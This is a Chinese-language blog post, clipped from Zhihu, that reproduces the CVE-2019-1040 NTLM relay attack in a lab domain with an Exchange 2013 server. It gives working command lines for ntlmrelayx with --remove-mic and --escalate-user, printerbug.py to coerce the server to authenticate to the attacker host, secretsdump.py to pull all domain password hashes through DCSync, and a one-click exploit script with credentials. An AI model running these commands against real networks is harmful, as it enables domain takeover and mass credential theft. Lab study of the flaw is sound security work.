> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [zhuanlan.zhihu.com](https://zhuanlan.zhihu.com/p/142080911)

前言
--

前两天闲来无事重新在虚拟机搭建了一个域环境，装上了 EXCHANGE2013 版本，于是想着顺便复现一下大杀器。

**背景描述**

此漏洞在 exchange_RCE 未出现前是域内大杀器，此漏洞可运用于已有域账户但是 exchange 已修补 rce 漏洞情况下展开攻击。2019 年 6 月 12 日，微软官方在 6 月的补丁日中发布了漏洞 CVE-2019-1040 的安全补丁，攻击者可以利用该漏洞绕过 NTLM MIC（消息完整性检查）。攻击者可以修改 NTLM 身份验证流程中的签名要求，完全删除签名验证，并尝试中继到目标服务器，不强制执行签名的服务器都易受到攻击。通过这种攻击能使攻击者在仅有一个普通域账号的情况下可远程控制 Windows 域内的任何机器，包括域控服务器。

**漏洞利用条件**

1. 已有域成员账号密码，存在一台 exchange 服务 2. 已有域成员账号密码，目标域内存在两个域。 3. **这里仅演示 exchange**

**漏洞细节**

用任何 AD 帐户，通过 SMB 连接到目标 Exchange 服务器，并触发 SpoolService 错误。目标服务器将通过 SMB 回连至攻击者主机，使用 ntlmrelayx 将 SMB 身份验证中继到 LDAP。使用中继的 LDAP 身份验证，为攻击者帐户授予 DCSync 权限。攻击者帐户使用 DCSync 转储 AD 中的所有密码哈希值。

**环境搭建**

```
DC（exchange）192.168.1.104
Windows7 域内机器 192.168.1.102
Atttcker:Mac 192.168.1.100

```

**漏洞利用过程**
----------

### **漏洞利用**

*   VPS 搭建 frp 代理服务端

![](https://pic2.zhimg.com/v2-554797df9ec1d496de1df903e353e2d1_r.jpg)

*   Win7 搭建代理隧道

![](https://pic3.zhimg.com/v2-fa7a0ca9a2cad2ed178a2bc99644cd52_r.jpg)

*   Atttcker proxychains4

![](https://pic2.zhimg.com/v2-4b0b2d8537896530ff9822988e87677d_r.jpg)

*   ntlmrelayx.py 进行中继攻击

执行 ntlmrelayx.py 脚本进行 NTLM 中继攻击，设置 SMB 服务器并将认证凭据中继到 LDAP 协议。其中–remove-mic 选项用于清除 MIC 标志，–escalate-user 用于提升指定用户权限

```
proxychains4 python ntlmrelayx.py --escalate-user WIN7User -t ldap://AD.syst1m.local -smb2support --remove-mic --delegate-access

```

![](https://pic3.zhimg.com/v2-378735f201e2823a83329ceed54250f6_r.jpg)

*   Win7 搭建代理隧道

![](https://pic1.zhimg.com/v2-5f2392f4e0fe497e3e52df21fbedc708_r.jpg)

*   Atttcker frpc 配置

![](https://pic1.zhimg.com/v2-aa4e3ba7511e9b7569e42a6554a22eb0_r.jpg)

*   Proxifier 添加隧道，代理 frpc

![](https://pic4.zhimg.com/v2-844878df2846677cbf6318b80f81418b_r.jpg)

*   Atttcker 启动 frpc

![](https://pic3.zhimg.com/v2-36ccb74c9bdd99d5f7ab6413e8b2e5ee_r.jpg)

*   printerbug.py 脚本

> 触发 SpoolService 的 bug

```
python printerbug.py 域/用户名:密码@打印机服务ip 回连ip
proxychains4 python printerbug.py syst1m.local/WIN7User:win7user521.@192.168.1.104 192.168.1.102

```

**SpoolService 的 bug 导致 Exchange 服务器回连到 ntlmrelayx.py，即将认证信息发送到 ntlmrelayx.py**

![](https://pic2.zhimg.com/v2-337350bbdb4d026eb45031cf4237ca0d_r.jpg)

*   ntlmrelayx.py 结果

![](https://pic4.zhimg.com/v2-a00621b11cf53a1d44bcfda6de5734e7_r.jpg)

**secretsdump.py 去 dcsync**

*   secretsdump

```
proxychains4 secretsdump.py syst1m.local/WIN7User@syst1m.local -just-dc

```

![](https://pic2.zhimg.com/v2-a731f05f8482196941527aec7b1f8a89_r.jpg)

**CVE-2019-1040 一键化脚本**
-----------------------

> 来自 evi1cg 师傅写的利用工具

```
https://github.com/Ridter/CVE-2019-1040

```

*   **使用方式**

```
python CVE-2019-1040.py -ah 192.168.1.100 -u 'WIN7User' -p 'win7user521.' -d 'syst1m.local' -th 192.168.1.103 192.168.1.104

```

*   **漏洞利用**

![](https://pic2.zhimg.com/v2-415b8eea8d1cc8334c563006b03d62c9_r.jpg)

### **参考**

```
https://github.com/Ridter/CVE-2019-1040
https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/

```

**首发来源：**[cve-2019-1040-intranet-killer](https://link.zhihu.com/?target=https%3A//syst1m.com/post/cve-2019-1040-intranet-killer/)

欢迎关注专栏，获取最新的、实用的信息安全信息。